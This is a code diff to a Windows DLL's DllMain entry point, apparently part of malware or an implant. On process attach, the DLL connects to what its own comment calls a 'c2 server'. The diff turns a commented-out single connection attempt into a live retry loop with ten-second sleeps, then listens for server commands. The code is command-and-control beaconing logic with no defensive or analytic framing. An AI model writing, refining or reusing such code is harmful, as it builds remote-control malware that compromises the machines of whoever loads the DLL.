@@ -35,17 +35,21 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:        
         std::unique_ptr<Client> me = std::make_unique<Client>();
-        BOOL connected = FALSE;
+        bool connected = false;
 
-        //do {
-            // try to connect to c2 server
-        connected = me->Connect();
-            //connectionAttempts++;
-            //Sleep(300000); // second interval before connecting again
-        //} while ( connected == FALSE && connectionAttempts < MAX_CON_ATTEMPTS );
+        do {
+            //try to connect to c2 server
+            connected = me->Connect();
+            connectionAttempts++;
+
+            if ( connected )
+                break;
+
+            Sleep(10000); // interval before connecting again
+        } while ( !connected && connectionAttempts < MAX_CON_ATTEMPTS );
 
         // failed.
-        if ( connected == FALSE && connectionAttempts >= MAX_CON_ATTEMPTS )
+        if ( !connected && connectionAttempts >= MAX_CON_ATTEMPTS )
             break;
 
         me->ListenForServerCommands();
